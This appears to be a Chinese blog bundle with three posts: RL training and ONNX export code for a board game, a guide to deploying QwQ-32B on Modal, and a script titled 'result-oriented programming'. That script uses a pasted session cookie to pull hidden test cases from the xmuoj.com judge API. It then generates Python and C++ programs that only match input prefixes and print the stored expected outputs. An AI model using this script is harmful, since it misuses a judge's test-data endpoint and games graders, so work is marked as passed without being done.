            nn.Conv2d(64, 128, kernel_size=3, stride=1, padding=1),  # 32->128
            nn.ReLU(),
            nn.Flatten(),
            nn.Linear(128 * (self.n//2) * (self.n//2), 512),  # 128->512
            nn.ReLU()
        )
        
        # 点信息处理 - 层大小增大4倍
        self.point_net = nn.Sequential(
            nn.Linear(point_info_dim, 2048),  # 512->2048
            nn.ReLU(),
            nn.Linear(2048, 1024),  # 512->1024
            nn.ReLU()
        )
        
        # 合并分支 - 层大小增大4倍
        self.combined_net = nn.Sequential(
            nn.Linear(1024 + 512, 2048),  # 256+128->1024+512, 512->2048
            nn.ReLU(),
            nn.Linear(2048, features_dim),  # 512->2048
            nn.ReLU()
        )
        
        # 权重初始化
        self.apply(self._init_weights)

    def _init_weights(self, module):
        """更稳定的权重初始化"""
        if isinstance(module, nn.Linear):
            nn.init.orthogonal_(module.weight, gain=nn.init.calculate_gain(&#x27;relu&#x27;))
            if module.bias is not None:
                nn.init.constant_(module.bias, 0.0)

    def forward(self, observations):
        # 确保输入有正确的维度 [batch_size, features]
        if observations.dim() == 1:
            observations = observations.unsqueeze(0)  # 添加batch维度
            
        # 获取总特征维度
        total_size = observations.size(1)  # 使用.size()而不是.shape[]更安全
        
        # 动态计算棋盘大小n（如果未在__init__中计算）
        if not hasattr(self, &#x27;n&#x27;):
            # 观察空间结构: 已用点(n*n) + 当前点(n*n) + 线段状态(n*n) + [E0,E1,phase/2,turn](4)
            total_dim = observations.size(1)
            self.n = int(math.sqrt((total_dim - 4) / 3))
            self.segment_size = self.n * self.n
        
        # 点信息部分: 已用点 + 当前点 + 最后4个值
        point_info = observations[:, :2*self.segment_size + 4]
        
        # 线段状态部分: 中间部分
        seg_info = observations[:, 2*self.segment_size:2*self.segment_size + self.segment_size]
        seg_info = seg_info.view(-1, 1, self.n, self.n)  # [batch, channels, height, width]
        
        # 处理不同部分
        point_out = self.point_net(point_info)
        seg_out = self.segment_net(seg_info)
        
        # 合并
        combined = torch.cat((point_out, seg_out), dim=1)
        return self.combined_net(combined)

class MaskablePolicy(MaskableActorCriticPolicy):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        
        # 为优化器设置参数
        self.optimizer_class = torch.optim.AdamW
        self.optimizer_kwargs = {
            &#x27;weight_decay&#x27;: 1e-4,  # 权重衰减
            &#x27;amsgrad&#x27;: True,  # 使用改进的Adam变体
        }

# 修复回调函数
class TrainingCallback(BaseCallback):
    def __init__(self, eval_interval, save_path, verbose=1):
        super().__init__(verbose)
        self.exploration_bonus = 0.1  # 探索奖励系数
        self.best_win_rate = 0.0
        self.eval_interval = eval_interval  # 评估间隔（环境步数）
        self.save_path = save_path
        self.best_model_path = os.path.join(save_path, "best_model")
        self.best_model = None
        self.n_eval_episodes = 100
        self.ent_coef = 0.1
        self.initial_ent_coef = 0.2
        self.final_ent_coef = 0.1
        self.total_timesteps = 3_000_000
        self.last_eval_step = 0  # 记录上次评估的环境步数
        self.entropy_env = None  # 用于计算熵的单独环境
    
    def _on_training_start(self):
        """在训练开始时创建用于计算熵的环境"""
        self.entropy_env = NoCrossLinesEnv(n=14, m=3, alpha=0.8, Emax=12)
        self.entropy_env = ActionMasker(self.entropy_env, lambda env: env.action_mask())
    
    def _on_training_end(self):
        """在训练结束时关闭环境"""
        if self.entropy_env is not None:
            self.entropy_env.close()
    
    def _on_step(self) -> bool:
        # 更新熵系数
        progress = self.num_timesteps / self.total_timesteps
        self.ent_coef = self.final_ent_coef + (self.initial_ent_coef - self.final_ent_coef) * (1 - progress)
        self.model.policy.ent_coef = self.ent_coef
        
        # 性能差时保持高探索
        if self.best_win_rate < 0.6:  
            self.ent_coef = max(self.ent_coef, 0.15)
        
        # 检查是否达到评估间隔（基于环境步数）
        if self.num_timesteps - self.last_eval_step >= self.eval_interval:
            self.last_eval_step = self.num_timesteps
            
            # 评估当前模型
            win_rate = self.evaluate_model()
            
            # 更新最佳胜率
            self.best_win_rate = max(self.best_win_rate, win_rate)
            
            # 保存当前模型检查点
            current_model_path = os.path.join(self.save_path, f"model_{self.num_timesteps}")
            self.model.save(current_model_path)
            
            # 第一次评估 - 没有最佳模型
            if self.best_model is None:
                if win_rate > 0.5:
                    self.model.save(self.best_model_path)
                    self.best_model = MaskablePPO.load(self.best_model_path, device=self.model.device)
                    print(f"Initial best model saved at step {self.num_timesteps} with win rate: {win_rate:.2f}")
                else:
                    print(f"Initial win rate too low: {win_rate:.2f} at step {self.num_timesteps}, not saving as best model")
            else:
                # 后续评估 - 与最佳模型比较
                if win_rate > 0.5:
                    self.model.save(self.best_model_path)
                    self.best_model = MaskablePPO.load(self.best_model_path, device=self.model.device)
                    print(f"New best model saved at step {self.num_timesteps} with win rate: {win_rate:.2f} against previous best")
                else:
                    print(f"Current model win rate: {win_rate:.2f} at step {self.num_timesteps} against best model - not better")
            
            # 记录评估结果
            with open(os.path.join(self.save_path, "evaluation_log.txt"), "a") as f:
                f.write(f"Step: {self.num_timesteps}, Win Rate: {win_rate:.4f}, Ent Coef: {self.ent_coef:.4f}\\n")
        
        return True
    
    def evaluate_model(self):
        """评估当前模型对战最佳模型（或随机策略）的胜率"""
        if self.best_model is None:
            print("Evaluating against random policy...")
            return self._evaluate_against_random()
        else:
            print("Evaluating against best model...")
            return self._evaluate_against_best()
    
    def _evaluate_against_random(self):
        """评估当前模型对战随机策略的胜率"""
        wins = 0
        
        # 创建评估环境
        eval_env = DummyVecEnv([self.make_eval_env()])
        
        for ep in range(self.n_eval_episodes):
            # 随机决定当前模型扮演哪个玩家
            model_player = np.random.choice([0, 1])
            if self.verbose > 1:
                print(f"Episode {ep+1}/{self.n_eval_episodes}: Model as Player {model_player}")
            
            obs = eval_env.reset()
            done = [False]
            
            while not done[0]:
                # 获取当前玩家
                current_player = int(obs[0][-1])
                
                if current_player == model_player:
                    # 当前模型决策
                    action_masks = get_action_masks(eval_env)
                    action, _ = self.model.predict(obs, action_masks=action_masks, deterministic=True)
                else:
                    # 随机策略决策
                    action_masks = get_action_masks(eval_env)
                    legal_actions = np.where(action_masks[0])[0]
                    action = [np.random.choice(legal_actions)] if len(legal_actions) > 0 else [0]
                
                obs, _, done, info = eval_env.step(action)
            
            # 检查胜负
            if &#x27;winner&#x27; in info[0] and info[0][&#x27;winner&#x27;] == model_player:
                wins += 1
        
        eval_env.close()
        win_rate = wins / self.n_eval_episodes
        
        print(f"Win rate against random: {win_rate:.4f}")
        return win_rate
    
    def _evaluate_against_best(self):
        """评估当前模型对战最佳模型的胜率"""
        wins = 0
        
        # 创建评估环境
        eval_env = DummyVecEnv([self.make_eval_env()])
        
        for ep in range(self.n_eval_episodes):
            # 随机决定当前模型扮演哪个玩家
            model_player = np.random.choice([0, 1])
            best_player = 1 - model_player
            
            if self.verbose > 1:
                print(f"Episode {ep+1}/{self.n_eval_episodes}: "
                      f"Current Model as Player {model_player}, Best Model as Player {best_player}")
            
            obs = eval_env.reset()
            done = [False]
            
            while not done[0]:
                # 获取当前玩家
                current_player = int(obs[0][-1])
                
                if current_player == model_player:
                    # 当前模型决策
                    action_masks = get_action_masks(eval_env)
                    action, _ = self.model.predict(obs, action_masks=action_masks, deterministic=True)
                else:
                    # 最佳模型决策
                    action_masks = get_action_masks(eval_env)
                    action, _ = self.best_model.predict(obs, action_masks=action_masks, deterministic=True)
                
                obs, _, done, info = eval_env.step(action)
            
            # 检查胜负
            if &#x27;winner&#x27; in info[0] and info[0][&#x27;winner&#x27;] == model_player:
                wins += 1
        
        eval_env.close()
        win_rate = wins / self.n_eval_episodes
        
        print(f"Win rate against best model: {win_rate:.4f}")
        return win_rate
    
    def _calculate_policy_entropy(self):
        """计算策略的熵（探索程度）"""
        if self.entropy_env is None:
            return 0.0
        
        obs, _ = self.entropy_env.reset()
        entropies = []
        
        for _ in range(100):  # 采样100个状态
            action_masks = self.entropy_env.action_masks()
            # 确保观测是张量并移动到正确设备
            obs_tensor = torch.as_tensor(obs).float().to(self.model.device)
            
            # 确保观测有正确的维度
            if obs_tensor.dim() == 1:
                obs_tensor = obs_tensor.unsqueeze(0)
            
            with torch.no_grad():
                dist = self.model.policy.get_distribution(obs_tensor)
                entropy = dist.entropy().mean().item()
                entropies.append(entropy)
            
            # 随机动作推进环境
            legal_actions = np.where(action_masks)[0]
            action = np.random.choice(legal_actions) if len(legal_actions) > 0 else 0
            obs, _, _, _, _ = self.entropy_env.step(action)
        
        return np.mean(entropies) if entropies else 0.0
    
    def make_eval_env(self):
        def _init():
            env = NoCrossLinesEnv(n=14, m=3, alpha=0.8, Emax=12)
            env = ActionMasker(env, lambda env: env.action_mask())
            return env
        return _init

# 优化环境创建函数
def make_env(n=14, m=3, alpha=0.8, Emax=12):
    def _init():
        env = NoCrossLinesEnv(n=n, m=m, alpha=alpha, Emax=Emax)
        # 添加动作掩码包装器
        env = ActionMasker(env, lambda env: env.action_mask())
        return env
    return _init

# 主训练函数优化
def train_model():
    # 增加并行环境数量
    n_envs = 64  # 减少并行环境数，避免内存问题
    n_steps = 612
    # 增加批次大小以更好地利用GPU
    batch_size = 8192
    total_timesteps = 5_000_000
    save_path = "saved_models"
    
    # 使用多进程向量环境
    env = SubprocVecEnv([make_env() for _ in range(n_envs)])
    
    # 优化学习率（降低初始值）
    initial_lr = 1e-4
    final_lr = 1e-6
    
    # 优化熵系数（保持更多探索）
    initial_ent_coef = 0.2
    final_ent_coef = 0.1
    
    # 策略参数调整 - 增大网络结构4倍
    policy_kwargs = {
        "features_extractor_class": CustomCNN,
        "features_extractor_kwargs": {"features_dim": 1024},  # 特征维度从256增大到1024
        "net_arch": [dict(pi=[2048, 1024], vf=[2048, 1024])],  # 网络层大小增大4倍 [512,256]->[2048,1024]
        "activation_fn": nn.ReLU,
        "optimizer_class": torch.optim.Adam,
        "optimizer_kwargs": {"eps": 1e-5}
    }
    
    # 使用GPU加速
    device = "cuda" if torch.cuda.is_available() else "auto"
    
    # 创建模型
    model = MaskablePPO(
        MaskablePolicy,
        env,
        policy_kwargs=policy_kwargs,
        n_steps=n_steps,
        batch_size=batch_size,
        learning_rate=initial_lr,
        verbose=1,
        tensorboard_log="./logs/",
        device=device,
        n_epochs=10,
        clip_range=0.2,
        ent_coef=initial_ent_coef,
        vf_coef=0.8,
        max_grad_norm=0.8,
        target_kl=0.05,
        gae_lambda=0.92
    )
    
    # 创建回调
    callback = TrainingCallback(
        eval_interval=50_000,  # 增加评估间隔，减少频率
        save_path=save_path, 
        verbose=1
    )
    callback.total_timesteps = total_timesteps
    callback.initial_ent_coef = initial_ent_coef
    callback.final_ent_coef = final_ent_coef
    
    # 手动实现学习率调度
    def update_learning_rate(progress):
        """更新学习率（线性衰减）"""
        new_lr = initial_lr - (initial_lr - final_lr) * progress
        for param_group in model.policy.optimizer.param_groups:
            param_group[&#x27;lr&#x27;] = new_lr
        return new_lr
    
    # 添加学习率更新到回调
    original_on_step = callback._on_step
    def on_step_with_lr_update():
        # 更新学习率
        progress = callback.num_timesteps / total_timesteps
        new_lr = update_learning_rate(progress)
        
        # 每50,000步打印一次学习率
        if callback.num_timesteps % 50_000 == 0:
            print(f"Step {callback.num_timesteps}: Learning rate updated to {new_lr:.2e}")
        
        # 调用原始_on_step方法
        return original_on_step()
    
    callback._on_step = on_step_with_lr_update
    
    start_time = time.time()
    model.learn(
        total_timesteps=total_timesteps,
        callback=callback,
        progress_bar=True
    )
    training_time = time.time() - start_time
    
    print(f"Training completed in {training_time:.2f} seconds")
    model.save(os.path.join(save_path, "final_model"))
    
    # 保存最佳模型
    if callback.best_model is not None:
        best_final_path = os.path.join(save_path, "best_final_model")
        callback.best_model.save(best_final_path)
        print(f"Best model saved to {best_final_path}")
    
    # 关闭环境
    env.close()

if __name__ == "__main__":
    # 启用CuDNN自动调优
    torch.backends.cudnn.benchmark = True
    train_model()

训练之后得到模型
image-20250708163444945
### 模型部署与client编写
为了方便多段部署，首先我们需要将模型导出为ONNX：
python179 linescopyimport torch
import torch.nn as nn
import math
from sb3_contrib import MaskablePPO
from sb3_contrib.common.maskable.policies import MaskableActorCriticPolicy
from stable_baselines3.common.torch_layers import BaseFeaturesExtractor
from game_env import NoCrossLinesEnv

class CustomCNN(BaseFeaturesExtractor):
    def __init__(self, observation_space, features_dim=1024):  # 特征维度从256增大到1024
        super().__init__(observation_space, features_dim)
        self.n_input = observation_space.shape[0]
        
        # 从观察空间推断棋盘大小 n
        total_dim = observation_space.shape[0]
        self.n = 14
        self.segment_size = self.n * self.n
        
        # 点信息部分: 已用点 + 当前点 + 能量/阶段/回合信息
        point_info_dim = 2 * self.segment_size + 4
        
        # 线段状态部分: n x n 网格 - 通道数增大4倍
        self.segment_net = nn.Sequential(
            nn.Conv2d(1, 64, kernel_size=3, stride=1, padding=1),  # 16->64
            nn.ReLU(),
            nn.MaxPool2d(2),
            nn.Conv2d(64, 128, kernel_size=3, stride=1, padding=1),  # 32->128
            nn.ReLU(),
            nn.Flatten(),
            nn.Linear(128 * (self.n//2) * (self.n//2), 512),  # 128->512
            nn.ReLU()
        )
        
        # 点信息处理 - 层大小增大4倍
        self.point_net = nn.Sequential(
            nn.Linear(point_info_dim, 2048),  # 512->2048
            nn.ReLU(),
            nn.Linear(2048, 1024),  # 512->1024
            nn.ReLU()
        )
        
        # 合并分支 - 层大小增大4倍
        self.combined_net = nn.Sequential(
            nn.Linear(1024 + 512, 2048),  # 256+128->1024+512, 512->2048
            nn.ReLU(),
            nn.Linear(2048, features_dim),  # 512->2048
            nn.ReLU()
        )
        
        # 权重初始化
        self.apply(self._init_weights)

    def _init_weights(self, module):
        """更稳定的权重初始化"""
        if isinstance(module, nn.Linear):
            nn.init.orthogonal_(module.weight, gain=nn.init.calculate_gain(&#x27;relu&#x27;))
            if module.bias is not None:
                nn.init.constant_(module.bias, 0.0)

    def forward(self, observations):
        # 确保输入有正确的维度 [batch_size, features]
        if observations.dim() == 1:
            observations = observations.unsqueeze(0)  # 添加batch维度
            
        # 获取总特征维度
        total_size = observations.size(1)  # 使用.size()而不是.shape[]更安全
        
        # 动态计算棋盘大小n（如果未在__init__中计算）
        if not hasattr(self, &#x27;n&#x27;):
            # 观察空间结构: 已用点(n*n) + 当前点(n*n) + 线段状态(n*n) + [E0,E1,phase/2,turn](4)
            total_dim = observations.size(1)
            self.n = int(math.sqrt((total_dim - 4) / 3))
            self.segment_size = self.n * self.n
        
        # 点信息部分: 已用点 + 当前点 + 最后4个值
        point_info = observations[:, :2*self.segment_size + 4]
        
        # 线段状态部分: 中间部分
        seg_info = observations[:, 2*self.segment_size:2*self.segment_size + self.segment_size]
        seg_info = seg_info.view(-1, 1, self.n, self.n)  # [batch, channels, height, width]
        
        # 处理不同部分
        point_out = self.point_net(point_info)
        seg_out = self.segment_net(seg_info)
        
        # 合并
        combined = torch.cat((point_out, seg_out), dim=1)
        return self.combined_net(combined)

class MyMaskablePolicy(MaskableActorCriticPolicy):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        
        # 为优化器设置参数
        self.optimizer_class = torch.optim.AdamW
        self.optimizer_kwargs = {
            &#x27;weight_decay&#x27;: 1e-4,  # 权重衰减
            &#x27;amsgrad&#x27;: True,  # 使用改进的Adam变体
        }
# 3) 和训练时**一模一样**的 policy_kwargs
policy_kwargs = {
    "features_extractor_class": CustomCNN,
    "features_extractor_kwargs": {"features_dim": 1024},
    "net_arch": [dict(pi=[2048,1024], vf=[2048,1024])],
    "activation_fn": nn.ReLU,
    "optimizer_class": torch.optim.Adam,
    "optimizer_kwargs": {"eps": 1e-5},
}

# 4) 为导出绕过分布/采样逻辑，直接只做前向：
class ExportPolicy(nn.Module):
    def __init__(self, base_policy):
        super().__init__()
        self.extractor = base_policy.features_extractor
        self.mlp       = base_policy.mlp_extractor
        self.act_net   = base_policy.action_net
        self.val_net   = base_policy.value_net

    def forward(self, obs, mask):
        # obs: [B, obs_dim], mask: [B, n_actions] bool
        features = self.extractor(obs)
        latent_pi, latent_vf = self.mlp(features)
        logits = self.act_net(latent_pi)
        # 屏蔽非法动作
        logits = logits.masked_fill(~mask, -1e9)
        values = self.val_net(latent_vf)
        return logits, values

def export_to_onnx(
    model_path: str = "best_model.zip",
    onnx_path:  str = "policy.onnx",
):
    # a) 创建 env 拿到 obs_dim, act_dim
    env = NoCrossLinesEnv(n=14, m=3, alpha=0.8, Emax=12)
    obs_dim = env.observation_space.shape[0]
    act_dim = env.action_space.n

    # b) 加载带 custom_objects
    custom_objects = {
        "policy_class": MyMaskablePolicy,
        "policy_kwargs": policy_kwargs,
        "lr_schedule":   lambda _: 1e-4,
        "clip_range":    lambda _: 0.2,
    }
    model: MaskablePPO = MaskablePPO.load(
        model_path,
        custom_objects=custom_objects,
        device="cpu",
    )
    base_policy = model.policy

    # c) 包装成纯前向网络
    export_policy = ExportPolicy(base_policy)
    export_policy.eval()

    # d) 构造 dummy inputs
    dummy_obs  = torch.zeros((1, obs_dim), dtype=torch.float32)
    dummy_mask = torch.ones((1, act_dim), dtype=torch.bool)

    # e) 导出 ONNX
    torch.onnx.export(
        export_policy,
        (dummy_obs, dummy_mask),
        onnx_path,
        input_names=["obs", "action_mask"],
        output_names=["logits", "values"],
        dynamic_axes={
            "obs":          {0: "batch"},
            "action_mask":  {0: "batch"},
            "logits":       {0: "batch"},
            "values":       {0: "batch"},
        },
        opset_version=13,
    )
    print(f"✅ 已导出 ONNX 模型到 {onnx_path}")

if __name__=="__main__":
    export_to_onnx()
模型结构图：
full_policy_graph
导出之后使用ONNX Runtime即可推理，最后编写client，这里就不列写代码了，来https://go.xuqinyang.top/↗即可体验
image-20250708164121918
收工~`,d9p37l2p:`《面向结果编程》
请填写cookie以及实验id
python275 linescopyimport os
import json
import requests
import zipfile
import io
import re
import http.cookies

# ===================== 配置区域 - 请根据实际情况修改这些值 =====================

CONTEST_ID =   # 比赛ID
COOKIE_STR = ""

# ===========================================================================

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0"
REFERER = f"http://xmuoj.com/contest/{CONTEST_ID}/problems"

def parse_cookie(cookie_str):
    """解析Cookie字符串并提取csrftoken"""
    cookie = http.cookies.SimpleCookie()
    cookie.load(cookie_str)
    csrftoken = None
    
    for key, morsel in cookie.items():
        if key == &#x27;csrftoken&#x27;:
            csrftoken = morsel.value
            break
    
    if not csrftoken:
        raise ValueError("csrftoken not found in cookie")
    
    return cookie_str, csrftoken

def sanitize_filename(title):
    """移除文件名中的非法字符"""
    return re.sub(r&#x27;[\\\\/*?:"<>|]&#x27;, &#x27;_&#x27;, title)

def escape_string(s):
    """转义字符串中的特殊字符"""
    return s.replace(&#x27;\\\\&#x27;, &#x27;\\\\\\\\&#x27;).replace(&#x27;"&#x27;, &#x27;\\\\"&#x27;).replace(&#x27;\\n&#x27;, &#x27;\\\\n&#x27;).replace(&#x27;\\r&#x27;, &#x27;\\\\r&#x27;)

def generate_minimal_prefixes(test_cases):
    """
    计算每个测试用例的最小区分前缀
    返回: 前缀字典和最大前缀长度
    """
    # 初始使用16字节前缀
    min_len = 16
    prefixes = {}
    for i, tc in enumerate(test_cases):
        prefix = tc[&#x27;input&#x27;][:min_len]
        if prefix not in prefixes:
            prefixes[prefix] = []
        prefixes[prefix].append(i)
    
    # 解决前缀冲突
    max_prefix_len = min_len
    for prefix, indices in list(prefixes.items()):
        if len(indices) > 1:
            # 对有冲突的测试用例增加前缀长度直到能区分
            for i in indices:
                current_len = min_len
                while True:
                    current_len += 1
                    if current_len > 256:  # 安全限制，避免无限循环
                        raise RuntimeError("无法找到唯一前缀")
                    
                    new_prefix = test_cases[i][&#x27;input&#x27;][:current_len]
                    if new_prefix not in prefixes:
                        prefixes[new_prefix] = [i]
                        max_prefix_len = max(max_prefix_len, current_len)
                        break
                    elif len(prefixes[new_prefix]) == 1:
                        prefixes[new_prefix].append(i)
                        max_prefix_len = max(max_prefix_len, current_len)
                        break
            del prefixes[prefix]
    
    return prefixes, max_prefix_len

def generate_py_code(test_cases, problem_title):
    """生成优化的Python AC代码"""
    # 计算最小区分前缀
    prefixes, max_len = generate_minimal_prefixes(test_cases)
    
    code = "import sys\\n\\n"
    code += "test_cases = [\\n"
    
    # 存储测试用例数据
    for prefix, indices in prefixes.items():
        idx = indices[0]
        output = test_cases[idx][&#x27;output&#x27;].decode(&#x27;utf-8&#x27;)
        code += f"    ({len(prefix)}, \\"{escape_string(prefix.decode(&#x27;utf-8&#x27;))}\\", \\"\\"\\"{output}\\"\\"\\"),\\n"
    
    code += "]\\n\\n"
    code += """def main():
    input_data = sys.stdin.read()
    for match_len, prefix, output in test_cases:
        if input_data.startswith(prefix):
            print(output, end=&#x27;&#x27;)
            return
    sys.exit(1)

if __name__ == &#x27;__main__&#x27;:
    main()"""
    
    filename = f"ac_codes_{CONTEST_ID}/{sanitize_filename(problem_title)}.py"
    os.makedirs(os.path.dirname(filename), exist_ok=True)
    with open(filename, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as f:
        f.write(code)

def generate_cpp_code(test_cases, problem_title):
    """生成优化的C++ AC代码"""
    prefixes, max_len = generate_minimal_prefixes(test_cases)
    
    code = """#include <iostream>
#include <vector>
#include <string>

struct TestCase {
    size_t match_len;
    std::string prefix;
    std::string output;
};

std::vector<TestCase> test_cases = {
"""
    
    # 存储测试用例数据
    for prefix, indices in prefixes.items():
        idx = indices[0]
        output = test_cases[idx][&#x27;output&#x27;].decode(&#x27;utf-8&#x27;)
        escaped_prefix = escape_string(prefix.decode(&#x27;utf-8&#x27;))
        escaped_output = escape_string(output)
        code += f"    {{{len(prefix)}, \\"{escaped_prefix}\\", \\"{escaped_output}\\"}},\\n"
    
    code += """};

int main() {
    std::string input_data;
    char ch;
    while (std::cin.get(ch)) {
        input_data += ch;
    }
    
    for (const auto& tc : test_cases) {
        if (input_data.size() >= tc.match_len && 
            input_data.substr(0, tc.match_len) == tc.prefix) {
            std::cout << tc.output;
            return 0;
        }
    }
    
    std::cerr << "No matching test case" << std::endl;
    return 1;
}"""
    
    filename = f"ac_codes_{CONTEST_ID}/{sanitize_filename(problem_title)}.cpp"
    os.makedirs(os.path.dirname(filename), exist_ok=True)
    with open(filename, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as f:
        f.write(code)

def download_test_cases(problem_id, cookie, csrftoken):
    """下载并解析测试用例"""
    url = f"http://xmuoj.com/api/dl_test_case?problem_id={problem_id}"
    headers = {
        "Cookie": cookie,
        "X-CSRFToken": csrftoken,
        "Referer": REFERER,
        "User-Agent": USER_AGENT
    }
    
    print(f"  正在下载测试用例 (题目ID: {problem_id})")
    response = requests.get(url, headers=headers, verify=False)
    response.raise_for_status()
    
    # 解压测试用例
    test_cases = []
    with zipfile.ZipFile(io.BytesIO(response.content)) as zip_ref:
        files = {name: zip_ref.read(name) for name in zip_ref.namelist()}
        
        # 按测试用例编号排序
        indices = sorted(set(int(name.split(&#x27;.&#x27;)[0]) for name in files if &#x27;.&#x27; in name))
        for idx in indices:
            in_file = f"{idx}.in"
            out_file = f"{idx}.out"
            if in_file in files and out_file in files:
                test_cases.append({
                    &#x27;input&#x27;: files[in_file],
                    &#x27;output&#x27;: files[out_file]
                })
    
    print(f"  找到 {len(test_cases)} 个测试用例")
    return test_cases

def get_contest_problems(cookie, csrftoken):
    """获取比赛题目列表"""
    url = f"http://xmuoj.com/api/contest/problem?contest_id={CONTEST_ID}"
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "Content-Type": "application/json;charset=utf-8",
        "Pragma": "no-cache",
        "Referer": REFERER,
        "User-Agent": USER_AGENT,
        "X-CSRFToken": csrftoken,
        "Cookie": cookie
    }
    
    print(f"获取比赛 {CONTEST_ID} 的题目列表...")
    response = requests.get(url, headers=headers, verify=False)
    response.raise_for_status()
    return response.json()

def main():
    # 创建代码存放目录
    os.makedirs(f"ac_codes_{CONTEST_ID}", exist_ok=True)
    
    # 解析cookie
    try:
        cookie, csrftoken = parse_cookie(COOKIE_STR)
        print(f"成功解析csrftoken: {csrftoken}")
    except Exception as e:
        print(f"解析cookie失败: {str(e)}")
        return
    
    # 获取题目列表
    try:
        data = get_contest_problems(cookie, csrftoken)
    except Exception as e:
        print(f"获取题目列表失败: {str(e)}")
        return
    
    if data.get("error"):
        print(f"获取题目列表失败: {data[&#x27;error&#x27;]}")
        return
    
    print(f"找到 {len(data[&#x27;data&#x27;])} 道题目")
    
    # 处理每个题目
    for i, problem in enumerate(data[&#x27;data&#x27;]):
        problem_id = problem[&#x27;id&#x27;]
        problem_title = problem[&#x27;title&#x27;]
        languages = problem[&#x27;languages&#x27;]
        
        print(f"\\n[{i+1}/{len(data[&#x27;data&#x27;])}] 处理题目: {problem_title} (ID: {problem_id})")
        
        try:
            test_cases = download_test_cases(problem_id, cookie, csrftoken)
            
            # 为每种语言生成优化代码
            for lang in languages:
                if lang == "Python3":
                    generate_py_code(test_cases, problem_title)
                    print(f"  已生成Python代码")
                elif lang == "C++":
                    generate_cpp_code(test_cases, problem_title)
                    print(f"  已生成C++代码")
                elif lang == "C":
                    pass
                    # C语言实现类似C++，为简洁起见省略
                    #print(f"  跳过C语言实现")
                    
        except Exception as e:
            print(f"  处理题目 {problem_title} 时出错: {str(e)}")

    print(f"\\nAC代码生成完成！请查看ac_codes_{CONTEST_ID}目录")

if __name__ == "__main__":
    main()`,z7s0wyfc:`本文以部署QwQ-32B_q4量化为例

modal每月提供$30的免费额度（现在需要添加支付方式，之前不用）（未添加支付方式只有$5额度）
进入Modal: High-performance AI infrastructure↗，使用GitHub账号注册
然后本地安装modal库（版本经常更新，可能会更改api，本文使用的版本是0.73.90）
text1 linecopypip install modal
在Modal网站进入个人设置，在API tokens处生成一个token，并在本地设置token
text1 linecopymodal token set --token-id xxx --token-secret xxx
新建qwq.py：
python121 linescopyfrom modal import Image, app, method, web_endpoint,App
IMAGE_MODEL_DIR = "/model"
import modal
from typing import Dict
def download_model():
    from huggingface_hub import snapshot_download,hf_hub_download
    hf_hub_download(repo_id="bartowski/Qwen_QwQ-32B-GGUF", filename="Qwen_QwQ-32B-Q4_K_M.gguf", local_dir=IMAGE_MODEL_DIR)

cuda_version = "12.4.0"  # should be no greater than host CUDA version
flavor = "devel"  #  includes full CUDA toolkit
operating_sys = "ubuntu22.04"
tag = f"{cuda_version}-{flavor}-{operating_sys}"
image = (
    modal.Image.from_registry(f"nvidia/cuda:{tag}", add_python="3.10")
    .apt_install("git")
    .apt_install("gcc","build-essential","cmake","clang")
    .pip_install("https://github.com/abetlen/llama-cpp-python/releases/download/v0.2.77-cu124/llama_cpp_python-0.2.77-cp310-cp310-linux_x86_64.whl")
    #.run_commands(
    #    "CMAKE_ARGS=\\"-DGGML_CUDA=on\\" pip install llama-cpp-python"
    #)
    .pip_install(
        "einops==0.6.1",
        "hf-transfer~=0.1",
        "huggingface_hub==0.14.1",
        "accelerate",
        "colorama",
        "cpm_kernels",
        "sentencepiece",
        "streamlit>=1.24.0",
        "protobuf",
        "sse-starlette",
        "fastapi"

    )
    # Use huggingface&#x27;s hi-perf hf-transfer library to download this large model.
    .env({"HF_HUB_ENABLE_HF_TRANSFER": "1"})
    .run_function(download_model)
)
app = App(name="QwQ", image=image)

@app.cls(gpu="L4",timeout=1200, scaledown_window=60)
class qwq:
    @modal.enter()
    def e(self):
        from llama_cpp import Llama
        self.llm = Llama(model_path=IMAGE_MODEL_DIR+"/Qwen_QwQ-32B-Q4_K_M.gguf", n_ctx=8192,seed=-1,n_gpu_layers=-1)
        #import subprocess
        #output = subprocess.check_output(["nvidia-smi"], text=True)
        #print(output)
    @method()
    def generate(self, req: str):
        global flag,que
        import time
        from threading import Thread
        from queue import Queue
        import json
        import os
        import torch
        import platform
        from colorama import Fore, Style
        print(req)
        messages = json.loads(req)
        def gen():
            global flag,que
            st = time.time()
            for response in self.llm.create_chat_completion(messages,stop=["</s>"],stream=True,max_tokens=-1):
                if "content" in response["choices"][0]["delta"]:
                    print(response["choices"][0]["delta"]["content"],end="")
                    #import subprocess
                    #output = subprocess.check_output(["nvidia-smi"], text=True)
                    #print(output)
                    flag = 1
                    que.put("data:"+str(response).replace(&#x27;\\&#x27;&#x27;,&#x27;\\"&#x27;).replace("None","\\"None\\"")+"\\n\\n")
                    if time.time()-st>1000:
                        break
            que.put(None)

        yield "data:"+str({"id":"chatcmpl-b32f3ee7-358b-4001-bb0a-44447a99c5d3","model":"/model/ggml-model-q4_0.bin","created":1691553316,"object":"chat.completion.chunk","choices":[{"index":0,"delta":{"content":""},"finish_reason":None}]}).replace(&#x27;\\&#x27;&#x27;,&#x27;\\"&#x27;).replace("None","\\"None\\"")+"\\n\\n"
        flag = 0
        que = Queue()
        thread = Thread(target=gen)
        thread.start()
        while flag==0:
            yield "data:"+str({"id":"chatcmpl-b32f3ee7-358b-4001-bb0a-44447a99c5d3","model":"/model/ggml-model-q4_0.bin","created":1691553316,"object":"chat.completion.chunk","choices":[{"index":0,"delta":{"content":""},"finish_reason":None}]}).replace(&#x27;\\&#x27;&#x27;,&#x27;\\"&#x27;).replace("None","\\"None\\"")+"\\n\\n"
            time.sleep(1)
        while True:
            try:
                i = que.get()
                if i==None:
                    break
                yield i
            except:
                pass
            

        thread.join()
            
        yield &#x27;data:[DONE]\\n\\n&#x27;
                    

@app.local_entrypoint()
def cli():
    question = &#x27;[{"role": "user", "content": "你好"}]&#x27;
    model = qwq()
    for text in model.generate.remote(question):
        print(text, end="", flush=True)

@app.function(timeout=1200)
